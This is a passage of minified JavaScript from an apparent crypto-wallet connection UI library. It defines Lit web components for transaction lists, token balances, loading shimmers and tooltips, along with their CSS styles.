    `:null}getDirectionIcon(){switch(this.direction){case"in":return"arrowBottom";case"out":return"arrowTop";default:return}}getIcon(){return this.onlyDirectionIcon?this.getDirectionIcon():this.type==="trade"?"swapHorizontal":this.type==="approve"?"checkmark":this.type==="cancel"?"close":this.getDirectionIcon()}getStatusColor(){switch(this.status){case"confirmed":return"success";case"failed":return"error";case"pending":return"inverse";default:return"accent-primary"}}};Df.styles=[jke];Wg([ie()],Df.prototype,"type",void 0);Wg([ie()],Df.prototype,"status",void 0);Wg([ie()],Df.prototype,"direction",void 0);Wg([ie({type:Boolean})],Df.prototype,"onlyDirectionIcon",void 0);Wg([ie({type:Array})],Df.prototype,"images",void 0);Wg([ie({type:Object})],Df.prototype,"secondImage",void 0);Df=Wg([Ue("wui-transaction-visual")],Df);const Mke=ot`
  :host {
    width: 100%;
  }

  :host > wui-flex:first-child {
    align-items: center;
    column-gap: ${({spacing:t})=>t[2]};
    padding: ${({spacing:t})=>t[1]} ${({spacing:t})=>t[2]};
    width: 100%;
  }

  :host > wui-flex:first-child wui-text:nth-child(1) {
    text-transform: capitalize;
  }

  wui-transaction-visual {
    width: 40px;
    height: 40px;
  }

  wui-flex {
    flex: 1;
  }

  :host wui-flex wui-flex {
    overflow: hidden;
  }

  :host .description-container wui-text span {
    word-break: break-all;
  }

  :host .description-container wui-text {
    overflow: hidden;
  }

  :host .description-separator-icon {
    margin: 0px 6px;
  }

  :host wui-text > span {
    overflow: hidden;
    display: -webkit-box;
    -webkit-box-orient: vertical;
    -webkit-line-clamp: 1;
  }
`;var Qp=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Ql=class extends $e{constructor(){super(...arguments),this.type="approve",this.onlyDirectionIcon=!1,this.images=[]}render(){return X`
      <wui-flex>
        <wui-transaction-visual
          .status=${this.status}
          direction=${et(this.direction)}
          type=${this.type}
          .onlyDirectionIcon=${this.onlyDirectionIcon}
          .images=${this.images}
        ></wui-transaction-visual>
        <wui-flex flexDirection="column" gap="1">
          <wui-text variant="lg-medium" color="primary">
            ${V7[this.type]||this.type}
          </wui-text>
          <wui-flex class="description-container">
            ${this.templateDescription()} ${this.templateSecondDescription()}
          </wui-flex>
        </wui-flex>
        <wui-text variant="sm-medium" color="secondary"><span>${this.date}</span></wui-text>
      </wui-flex>
    `}templateDescription(){const e=this.descriptions?.[0];return e?X`
          <wui-text variant="md-regular" color="secondary">
            <span>${e}</span>
          </wui-text>
        `:null}templateSecondDescription(){const e=this.descriptions?.[1];return e?X`
          <wui-icon class="description-separator-icon" size="sm" name="arrowRight"></wui-icon>
          <wui-text variant="md-regular" color="secondary">
            <span>${e}</span>
          </wui-text>
        `:null}};Ql.styles=[Dt,Mke];Qp([ie()],Ql.prototype,"type",void 0);Qp([ie({type:Array})],Ql.prototype,"descriptions",void 0);Qp([ie()],Ql.prototype,"date",void 0);Qp([ie({type:Boolean})],Ql.prototype,"onlyDirectionIcon",void 0);Qp([ie()],Ql.prototype,"status",void 0);Qp([ie()],Ql.prototype,"direction",void 0);Qp([ie({type:Array})],Ql.prototype,"images",void 0);Ql=Qp([Ue("wui-transaction-list-item")],Ql);const Uke=ot`
  :host {
    display: block;
    background: linear-gradient(
      90deg,
      ${({tokens:t})=>t.theme.foregroundSecondary} 0%,
      ${({tokens:t})=>t.theme.foregroundTertiary} 50%,
      ${({tokens:t})=>t.theme.foregroundSecondary} 100%
    );
    background-size: 200% 100%;
    animation: shimmer 1s ease-in-out infinite;
    border-radius: ${({borderRadius:t})=>t[2]};
  }

  :host([data-rounded='true']) {
    border-radius: ${({borderRadius:t})=>t[16]};
  }

  @keyframes shimmer {
    0% {
      background-position: 200% 0;
    }
    100% {
      background-position: -200% 0;
    }
  }
`;var mA=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let vg=class extends $e{constructor(){super(...arguments),this.width="",this.height="",this.variant="default",this.rounded=!1}render(){return this.style.cssText=`
      width: ${this.width};
      height: ${this.height};
    `,this.dataset.rounded=this.rounded?"true":"false",X`<slot></slot>`}};vg.styles=[Uke];mA([ie()],vg.prototype,"width",void 0);mA([ie()],vg.prototype,"height",void 0);mA([ie()],vg.prototype,"variant",void 0);mA([ie({type:Boolean})],vg.prototype,"rounded",void 0);vg=mA([Ue("wui-shimmer")],vg);const Lke=ot`
  wui-flex {
    position: relative;
    display: inline-flex;
    justify-content: center;
    align-items: center;
  }

  wui-image {
    border-radius: ${({borderRadius:t})=>t[128]};
  }

  .fallback-icon {
    color: ${({tokens:t})=>t.theme.iconInverse};
    border-radius: ${({borderRadius:t})=>t[3]};
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
  }

  .direction-icon,
  .status-image {
    position: absolute;
    right: 0;
    bottom: 0;
    border-radius: ${({borderRadius:t})=>t[128]};
    border: 2px solid ${({tokens:t})=>t.theme.backgroundPrimary};
  }

  .direction-icon {
    padding: ${({spacing:t})=>t["01"]};
    color: ${({tokens:t})=>t.core.iconSuccess};

    background-color: color-mix(
      in srgb,
      ${({tokens:t})=>t.core.textSuccess} 30%,
      ${({tokens:t})=>t.theme.backgroundPrimary} 70%
    );
  }

  /* -- Sizes --------------------------------------------------- */
  :host([data-size='sm']) > wui-image:not(.status-image),
  :host([data-size='sm']) > wui-flex {
    width: 24px;
    height: 24px;
  }

  :host([data-size='lg']) > wui-image:not(.status-image),
  :host([data-size='lg']) > wui-flex {
    width: 40px;
    height: 40px;
  }

  :host([data-size='sm']) .fallback-icon {
    height: 16px;
    width: 16px;
    padding: ${({spacing:t})=>t[1]};
  }

  :host([data-size='lg']) .fallback-icon {
    height: 32px;
    width: 32px;
    padding: ${({spacing:t})=>t[1]};
  }

  :host([data-size='sm']) .direction-icon,
  :host([data-size='sm']) .status-image {
    transform: translate(40%, 30%);
  }

  :host([data-size='lg']) .direction-icon,
  :host([data-size='lg']) .status-image {
    transform: translate(40%, 10%);
  }

  :host([data-size='sm']) .status-image {
    height: 14px;
    width: 14px;
  }

  :host([data-size='lg']) .status-image {
    height: 20px;
    width: 20px;
  }

  /* -- Crop effects --------------------------------------------------- */
  .swap-crop-left-image,
  .swap-crop-right-image {
    position: absolute;
    top: 0;
    bottom: 0;
  }

  .swap-crop-left-image {
    left: 0;
    clip-path: inset(0px calc(50% + 1.5px) 0px 0%);
  }

  .swap-crop-right-image {
    right: 0;
    clip-path: inset(0px 0px 0px calc(50% + 1.5px));
  }
`;var gA=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};const z9={sm:"xxs",lg:"md"};let Eg=class extends $e{constructor(){super(...arguments),this.type="approve",this.size="lg",this.statusImageUrl="",this.images=[]}render(){return X`<wui-flex>${this.templateVisual()} ${this.templateIcon()}</wui-flex>`}templateVisual(){switch(this.dataset.size=this.size,this.type){case"trade":return this.swapTemplate();case"fiat":return this.fiatTemplate();case"unknown":return this.unknownTemplate();default:return this.tokenTemplate()}}swapTemplate(){const[e,n]=this.images;return this.images.length===2&&(e||n)?X`
        <wui-image class="swap-crop-left-image" src=${e} alt="Swap image"></wui-image>
        <wui-image class="swap-crop-right-image" src=${n} alt="Swap image"></wui-image>
      `:e?X`<wui-image src=${e} alt="Swap image"></wui-image>`:null}fiatTemplate(){return X`<wui-icon
      class="fallback-icon"
      size=${z9[this.size]}
      name="dollar"
    ></wui-icon>`}unknownTemplate(){return X`<wui-icon
      class="fallback-icon"
      size=${z9[this.size]}
      name="questionMark"
    ></wui-icon>`}tokenTemplate(){const[e]=this.images;return e?X`<wui-image src=${e} alt="Token image"></wui-image> `:X`<wui-icon
      class="fallback-icon"
      name=${this.type==="nft"?"image":"coinPlaceholder"}
    ></wui-icon>`}templateIcon(){return this.statusImageUrl?X`<wui-image
        class="status-image"
        src=${this.statusImageUrl}
        alt="Status image"
      ></wui-image>`:X`<wui-icon
      class="direction-icon"
      size=${z9[this.size]}
      name=${this.getTemplateIcon()}
    ></wui-icon>`}getTemplateIcon(){return this.type==="trade"?"arrowClockWise":"arrowBottom"}};Eg.styles=[Lke];gA([ie()],Eg.prototype,"type",void 0);gA([ie()],Eg.prototype,"size",void 0);gA([ie()],Eg.prototype,"statusImageUrl",void 0);gA([ie({type:Array})],Eg.prototype,"images",void 0);Eg=gA([Ue("wui-transaction-thumbnail")],Eg);const Fke=ot`
  :host > wui-flex:first-child {
    gap: ${({spacing:t})=>t[2]};
    padding: ${({spacing:t})=>t[3]};
    width: 100%;
  }

  wui-flex {
    display: flex;
    flex: 1;
  }
`;var $ke=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let W7=class extends $e{render(){return X`
      <wui-flex alignItems="center">
        <wui-shimmer width="40px" height="40px" rounded></wui-shimmer>
        <wui-flex flexDirection="column" gap="1">
          <wui-shimmer width="124px" height="16px" rounded></wui-shimmer>
          <wui-shimmer width="60px" height="14px" rounded></wui-shimmer>
        </wui-flex>
        <wui-shimmer width="24px" height="12px" rounded></wui-shimmer>
      </wui-flex>
    `}};W7.styles=[Dt,Fke];W7=$ke([Ue("wui-transaction-list-item-loader")],W7);const Hke=ot`
  :host {
    min-height: 100%;
  }

  .group-container[last-group='true'] {
    padding-bottom: ${({spacing:t})=>t[3]};
  }

  .contentContainer {
    height: 280px;
  }

  .contentContainer > wui-icon-box {
    width: 40px;
    height: 40px;
    border-radius: ${({borderRadius:t})=>t[3]};
  }

  .contentContainer > .textContent {
    width: 65%;
  }

  .emptyContainer {
    height: 100%;
  }
`;var Gg=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};const dW="last-transaction",zke=7;let Bf=class extends $e{constructor(){super(),this.unsubscribe=[],this.paginationObserver=void 0,this.page="activity",this.caipAddress=Y.state.activeCaipAddress,this.transactionsByYear=fo.state.transactionsByYear,this.loading=fo.state.loading,this.empty=fo.state.empty,this.next=fo.state.next,fo.clearCursor(),this.unsubscribe.push(Y.subscribeKey("activeCaipAddress",e=>{e&&this.caipAddress!==e&&(fo.resetTransactions(),fo.fetchTransactions(e)),this.caipAddress=e}),Y.subscribeKey("activeCaipNetwork",()=>{this.updateTransactionView()}),fo.subscribe(e=>{this.transactionsByYear=e.transactionsByYear,this.loading=e.loading,this.empty=e.empty,this.next=e.next}))}firstUpdated(){this.updateTransactionView(),this.createPaginationObserver()}updated(){this.setPaginationObserver()}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return X` ${this.empty?null:this.templateTransactionsByYear()}
    ${this.loading?this.templateLoading():null}
    ${!this.loading&&this.empty?this.templateEmpty():null}`}updateTransactionView(){fo.resetTransactions(),this.caipAddress&&fo.fetchTransactions(xe.getPlainAddress(this.caipAddress))}templateTransactionsByYear(){return Object.keys(this.transactionsByYear).sort().reverse().map(n=>{const r=parseInt(n,10),i=new Array(12).fill(null).map((s,o)=>{const a=Wb.getTransactionGroupTitle(r,o),c=this.transactionsByYear[r]?.[o];return{groupTitle:a,transactions:c}}).filter(({transactions:s})=>s).reverse();return i.map(({groupTitle:s,transactions:o},a)=>{const c=a===i.length-1;return o?X`
          <wui-flex
            flexDirection="column"
            class="group-container"
            last-group="${c?"true":"false"}"
            data-testid="month-indexes"
          >
            <wui-flex
              alignItems="center"
              flexDirection="row"
              .padding=${["2","3","3","3"]}
            >
              <wui-text variant="md-medium" color="secondary" data-testid="group-title">
                ${s}
              </wui-text>
            </wui-flex>
            <wui-flex flexDirection="column" gap="2">
              ${this.templateTransactions(o,c)}
            </wui-flex>
          </wui-flex>
        `:null})})}templateRenderTransaction(e,n){const{date:r,descriptions:i,direction:s,images:o,status:a,type:c,transfers:l,isAllNFT:f}=this.getTransactionListItemProps(e);return X`
      <wui-transaction-list-item
        date=${r}
        .direction=${s}
        id=${n&&this.next?dW:""}
        status=${a}
        type=${c}
        .images=${o}
        .onlyDirectionIcon=${f||l.length===1}
        .descriptions=${i}
      ></wui-transaction-list-item>
    `}templateTransactions(e,n){return e.map((r,i)=>{const s=n&&i===e.length-1;return X`${this.templateRenderTransaction(r,s)}`})}emptyStateActivity(){return X`<wui-flex
      class="emptyContainer"
      flexGrow="1"
      flexDirection="column"
      justifyContent="center"
      alignItems="center"
      .padding=${["10","5","10","5"]}
      gap="5"
      data-testid="empty-activity-state"
    >
      <wui-icon-box color="default" icon="wallet" size="xl"></wui-icon-box>
      <wui-flex flexDirection="column" alignItems="center" gap="2">
        <wui-text align="center" variant="lg-medium" color="primary">No Transactions yet</wui-text>
        <wui-text align="center" variant="lg-regular" color="secondary"
          >Start trading on dApps <br />
          to grow your wallet!</wui-text
        >
      </wui-flex>
    </wui-flex>`}emptyStateAccount(){return X`<wui-flex
      class="contentContainer"
      alignItems="center"
      justifyContent="center"
      flexDirection="column"
      gap="4"
      data-testid="empty-account-state"
    >
      <wui-icon-box icon="swapHorizontal" size="lg" color="default"></wui-icon-box>
      <wui-flex
        class="textContent"
        gap="2"
        flexDirection="column"
        justifyContent="center"
        flexDirection="column"
      >
        <wui-text variant="md-regular" align="center" color="primary">No activity yet</wui-text>
        <wui-text variant="sm-regular" align="center" color="secondary"
          >Your next transactions will appear here</wui-text
        >
      </wui-flex>
      <wui-link @click=${this.onReceiveClick.bind(this)}>Trade</wui-link>
    </wui-flex>`}templateEmpty(){return this.page==="account"?X`${this.emptyStateAccount()}`:X`${this.emptyStateActivity()}`}templateLoading(){return this.page==="activity"?Array(zke).fill(X` <wui-transaction-list-item-loader></wui-transaction-list-item-loader> `).map(e=>e):null}onReceiveClick(){we.push("WalletReceive")}createPaginationObserver(){const{projectId:e}=de.state;this.paginationObserver=new IntersectionObserver(([n])=>{n?.isIntersecting&&!this.loading&&(fo.fetchTransactions(xe.getPlainAddress(this.caipAddress)),tt.sendEvent({type:"track",event:"LOAD_MORE_TRANSACTIONS",properties:{address:xe.getPlainAddress(this.caipAddress),projectId:e,cursor:this.next,isSmartAccount:Zr(Y.state.activeChain)===Xn.ACCOUNT_TYPES.SMART_ACCOUNT}}))},{}),this.setPaginationObserver()}setPaginationObserver(){this.paginationObserver?.disconnect();const e=this.shadowRoot?.querySelector(`#${dW}`);e&&this.paginationObserver?.observe(e)}getTransactionListItemProps(e){const n=Ik.formatDate(e?.metadata?.minedAt),r=Wb.mergeTransfers(e?.transfers),i=Wb.getTransactionDescriptions(e,r),s=r?.[0],o=!!s&&r?.every(c=>!!c.nft_info),a=Wb.getTransactionImages(r);return{date:n,direction:s?.direction,descriptions:i,isAllNFT:o,images:a,status:e.metadata?.status,transfers:r,type:e.metadata?.operationType}}};Bf.styles=Hke;Gg([ie()],Bf.prototype,"page",void 0);Gg([Ee()],Bf.prototype,"caipAddress",void 0);Gg([Ee()],Bf.prototype,"transactionsByYear",void 0);Gg([Ee()],Bf.prototype,"loading",void 0);Gg([Ee()],Bf.prototype,"empty",void 0);Gg([Ee()],Bf.prototype,"next",void 0);Bf=Gg([Ue("w3m-activity-list")],Bf);const qke=mr`
  :host {
    width: 100%;
    max-height: 280px;
    overflow: scroll;
    scrollbar-width: none;
  }

  :host::-webkit-scrollbar {
    display: none;
  }
`;var Vke=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let G7=class extends $e{render(){return X`<w3m-activity-list page="account"></w3m-activity-list>`}};G7.styles=qke;G7=Vke([Ue("w3m-account-activity-widget")],G7);const Wke=ot`
  :host {
    width: 100%;
  }

  button {
    width: 100%;
    display: flex;
    justify-content: space-between;
    align-items: center;
    gap: ${({spacing:t})=>t[4]};
    padding: ${({spacing:t})=>t[4]};
    background-color: transparent;
    border-radius: ${({borderRadius:t})=>t[4]};
  }

  wui-text {
    max-width: 174px;
  }

  .tag-container {
    width: fit-content;
  }

  @media (hover: hover) {
    button:hover:enabled {
      background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
    }
  }
`;var cw=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Bp=class extends $e{constructor(){super(...arguments),this.icon="card",this.text="",this.description="",this.tag=void 0,this.disabled=!1}render(){return X`
      <button ?disabled=${this.disabled}>
        <wui-flex alignItems="center" gap="3">
          <wui-icon-box padding="2" color="secondary" icon=${this.icon} size="lg"></wui-icon-box>
          <wui-flex flexDirection="column" gap="1">
            <wui-text variant="md-medium" color="primary">${this.text}</wui-text>
            ${this.description?X`<wui-text variant="md-regular" color="secondary">
                  ${this.description}</wui-text
                >`:null}
          </wui-flex>
        </wui-flex>

        <wui-flex class="tag-container" alignItems="center" gap="1" justifyContent="flex-end">
          ${this.tag?X`<wui-tag tagType="main" size="sm">${this.tag}</wui-tag>`:null}
          <wui-icon size="md" name="chevronRight" color="default"></wui-icon>
        </wui-flex>
      </button>
    `}};Bp.styles=[Dt,nr,Wke];cw([ie()],Bp.prototype,"icon",void 0);cw([ie()],Bp.prototype,"text",void 0);cw([ie()],Bp.prototype,"description",void 0);cw([ie()],Bp.prototype,"tag",void 0);cw([ie({type:Boolean})],Bp.prototype,"disabled",void 0);Bp=cw([Ue("wui-list-description")],Bp);const Gke=ot`
  :host {
    width: 100%;
  }

  button {
    padding: ${({spacing:t})=>t[3]};
    display: flex;
    justify-content: space-between;
    width: 100%;
    border-radius: ${({borderRadius:t})=>t[4]};
    background-color: transparent;
  }

  @media (hover: hover) {
    button:hover:enabled {
      background-color: ${({tokens:t})=>t.theme.foregroundSecondary};
    }
  }

  button:focus-visible:enabled {
    background-color: ${({tokens:t})=>t.theme.foregroundSecondary};
    box-shadow: 0 0 0 4px ${({tokens:t})=>t.core.foregroundAccent040};
  }

  button[data-clickable='false'] {
    pointer-events: none;
    background-color: transparent;
  }

  wui-image,
  wui-icon {
    width: ${({spacing:t})=>t[10]};
    height: ${({spacing:t})=>t[10]};
  }

  wui-image {
    border-radius: ${({borderRadius:t})=>t[16]};
  }
`;var Kg=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let jf=class extends $e{constructor(){super(...arguments),this.tokenName="",this.tokenImageUrl="",this.tokenValue=0,this.tokenAmount="0.0",this.tokenCurrency="",this.clickable=!1}render(){return X`
      <button data-clickable=${String(this.clickable)}>
        <wui-flex gap="2" alignItems="center">
          ${this.visualTemplate()}
          <wui-flex flexDirection="column" justifyContent="space-between" gap="1">
            <wui-text variant="md-regular" color="primary">${this.tokenName}</wui-text>
            <wui-text variant="sm-regular-mono" color="secondary">
              ${CE.formatNumberToLocalString(this.tokenAmount,4)} ${this.tokenCurrency}
            </wui-text>
          </wui-flex>
        </wui-flex>
        <wui-flex
          flexDirection="column"
          justifyContent="space-between"
          gap="1"
          alignItems="flex-end"
        >
          <wui-text variant="md-regular-mono" color="primary"
            >$${this.tokenValue.toFixed(2)}</wui-text
          >
          <wui-text variant="sm-regular-mono" color="secondary">
            ${CE.formatNumberToLocalString(this.tokenAmount,4)}
          </wui-text>
        </wui-flex>
      </button>
    `}visualTemplate(){return this.tokenName&&this.tokenImageUrl?X`<wui-image alt=${this.tokenName} src=${this.tokenImageUrl}></wui-image>`:X`<wui-icon name="coinPlaceholder" color="default"></wui-icon>`}};jf.styles=[Dt,nr,Gke];Kg([ie()],jf.prototype,"tokenName",void 0);Kg([ie()],jf.prototype,"tokenImageUrl",void 0);Kg([ie({type:Number})],jf.prototype,"tokenValue",void 0);Kg([ie()],jf.prototype,"tokenAmount",void 0);Kg([ie()],jf.prototype,"tokenCurrency",void 0);Kg([ie({type:Boolean})],jf.prototype,"clickable",void 0);jf=Kg([Ue("wui-list-token")],jf);const Kke=mr`
  :host {
    width: 100%;
  }

  wui-flex {
    width: 100%;
  }

  .contentContainer {
    max-height: 280px;
    overflow: scroll;
    scrollbar-width: none;
  }

  .contentContainer::-webkit-scrollbar {
    display: none;
  }
`;var nj=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let g_=class extends $e{constructor(){super(),this.unsubscribe=[],this.tokenBalance=Y.getAccountData()?.tokenBalance,this.remoteFeatures=de.state.remoteFeatures,this.unsubscribe.push(Y.subscribeChainProp("accountState",e=>{this.tokenBalance=e?.tokenBalance}),de.subscribeKey("remoteFeatures",e=>{this.remoteFeatures=e}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return X`${this.tokenTemplate()}`}tokenTemplate(){return this.tokenBalance&&this.tokenBalance?.length>0?X`<wui-flex class="contentContainer" flexDirection="column" gap="2">
        ${this.tokenItemTemplate()}
      </wui-flex>`:X` <wui-flex flexDirection="column">
      ${this.onRampTemplate()}
      <wui-list-description
        @click=${this.onReceiveClick.bind(this)}
        text="Receive funds"
        description="Scan the QR code and receive funds"
        icon="qrCode"
        iconColor="fg-200"
        iconBackgroundColor="fg-200"
        data-testid="w3m-account-receive-button"
      ></wui-list-description
    ></wui-flex>`}onRampTemplate(){return this.remoteFeatures?.onramp?X`<wui-list-description
        @click=${this.onBuyClick.bind(this)}
        text="Buy Crypto"
        description="Easy with card or bank account"
        icon="card"
        iconColor="success-100"
        iconBackgroundColor="success-100"
        tag="popular"
        data-testid="w3m-account-onramp-button"
      ></wui-list-description>`:X``}tokenItemTemplate(){return this.tokenBalance?.map(e=>X`<wui-list-token
          tokenName=${e.name}
          tokenImageUrl=${e.iconUrl}
          tokenAmount=${e.quantity.numeric}
          tokenValue=${e.value}
          tokenCurrency=${e.symbol}
        ></wui-list-token>`)}onReceiveClick(){we.push("WalletReceive")}onBuyClick(){tt.sendEvent({type:"track",event:"SELECT_BUY_CRYPTO",properties:{isSmartAccount:Zr(Y.state.activeChain)===Xn.ACCOUNT_TYPES.SMART_ACCOUNT}}),we.push("OnRampProviders")}};g_.styles=Kke;nj([Ee()],g_.prototype,"tokenBalance",void 0);nj([Ee()],g_.prototype,"remoteFeatures",void 0);g_=nj([Ue("w3m-account-tokens-widget")],g_);const Zke=mr`
  :host {
    width: 100%;
    display: block;
  }
`;var rj=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let y_=class extends $e{constructor(){super(),this.unsubscribe=[],this.text="",this.open=kc.state.open,this.unsubscribe.push(we.subscribeKey("view",()=>{kc.hide()}),kt.subscribeKey("open",e=>{e||kc.hide()}),kc.subscribeKey("open",e=>{this.open=e}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e()),kc.hide()}render(){return X`
      <div
        @pointermove=${this.onMouseEnter.bind(this)}
        @pointerleave=${this.onMouseLeave.bind(this)}
      >
        ${this.renderChildren()}
      </div>
    `}renderChildren(){return X`<slot></slot> `}onMouseEnter(){const e=this.getBoundingClientRect();if(!this.open){const n=document.querySelector("w3m-modal"),r={width:e.width,height:e.height,left:e.left,top:e.top};if(n){const i=n.getBoundingClientRect();r.left=e.left-(window.innerWidth-i.width)/2,r.top=e.top-(window.innerHeight-i.height)/2}kc.showTooltip({message:this.text,triggerRect:r,variant:"shade"})}}onMouseLeave(e){this.contains(e.relatedTarget)||kc.hide()}};y_.styles=[Zke];rj([ie()],y_.prototype,"text",void 0);rj([Ee()],y_.prototype,"open",void 0);y_=rj([Ue("w3m-tooltip-trigger")],y_);const Yke=ot`
  :host {
    pointer-events: none;
  }

  :host > wui-flex {
    display: var(--w3m-tooltip-display);
    opacity: var(--w3m-tooltip-opacity);
    padding: 9px ${({spacing:t})=>t[3]} 10px ${({spacing:t})=>t[3]};
    border-radius: ${({borderRadius:t})=>t[3]};
    color: ${({tokens:t})=>t.theme.backgroundPrimary};
    position: absolute;
    top: var(--w3m-tooltip-top);
    left: var(--w3m-tooltip-left);
    transform: translate(calc(-50% + var(--w3m-tooltip-parent-width)), calc(-100% - 8px));
    max-width: calc(var(--apkt-modal-width) - ${({spacing:t})=>t[5]});
    transition: opacity ${({durations:t})=>t.lg}
      ${({easings:t})=>t["ease-out-power-2"]};
    will-change: opacity;
    opacity: 0;
    animation-duration: ${({durations:t})=>t.xl};
    animation-timing-function: ${({easings:t})=>t["ease-out-power-2"]};
    animation-name: fade-in;
    animation-fill-mode: forwards;
  }

  :host([data-variant='shade']) > wui-flex {
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
  }

  :host([data-variant='shade']) > wui-flex > wui-text {
    color: ${({tokens:t})=>t.theme.textSecondary};
  }

  :host([data-variant='fill']) > wui-flex {
    background-color: ${({tokens:t})=>t.theme.textPrimary};
    border: none;
  }

  wui-icon {
    position: absolute;
    width: 12px !important;
    height: 4px !important;
    color: ${({tokens:t})=>t.theme.foregroundPrimary};
  }

  wui-icon[data-placement='top'] {
    bottom: 0px;
    left: 50%;
    transform: translate(-50%, 95%);
  }

  wui-icon[data-placement='bottom'] {
    top: 0;
    left: 50%;
    transform: translate(-50%, -95%) rotate(180deg);
  }

  wui-icon[data-placement='right'] {
    top: 50%;
    left: 0;
    transform: translate(-65%, -50%) rotate(90deg);
  }

  wui-icon[data-placement='left'] {
    top: 50%;
    right: 0%;
    transform: translate(65%, -50%) rotate(270deg);
  }

  @keyframes fade-in {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }
`;var yA=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let _g=class extends $e{constructor(){super(),this.unsubscribe=[],this.open=kc.state.open,this.message=kc.state.message,this.triggerRect=kc.state.triggerRect,this.variant=kc.state.variant,this.unsubscribe.push(kc.subscribe(e=>{this.open=e.open,this.message=e.message,this.triggerRect=e.triggerRect,this.variant=e.variant}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){this.dataset.variant=this.variant;const e=this.triggerRect.top,n=this.triggerRect.left;return this.style.cssText=`
    --w3m-tooltip-top: ${e}px;
    --w3m-tooltip-left: ${n}px;
    --w3m-tooltip-parent-width: ${this.triggerRect.width/2}px;
    --w3m-tooltip-display: ${this.open?"flex":"none"};
    --w3m-tooltip-opacity: ${this.open?1:0};
    `,X`<wui-flex>
      <wui-icon data-placement="top" size="inherit" name="cursor"></wui-icon>
      <wui-text color="primary" variant="sm-regular">${this.message}</wui-text>
    </wui-flex>`}};_g.styles=[Yke];yA([Ee()],_g.prototype,"open",void 0);yA([Ee()],_g.prototype,"message",void 0);yA([Ee()],_g.prototype,"triggerRect",void 0);yA([Ee()],_g.prototype,"variant",void 0);_g=yA([Ue("w3m-tooltip")],_g);const Qke=ot`
  wui-flex {
    width: 100%;
  }

  wui-promo {
    position: absolute;
    top: -32px;
  }

  wui-profile-button {
    margin-top: calc(-1 * ${({spacing:t})=>t[4]});
  }

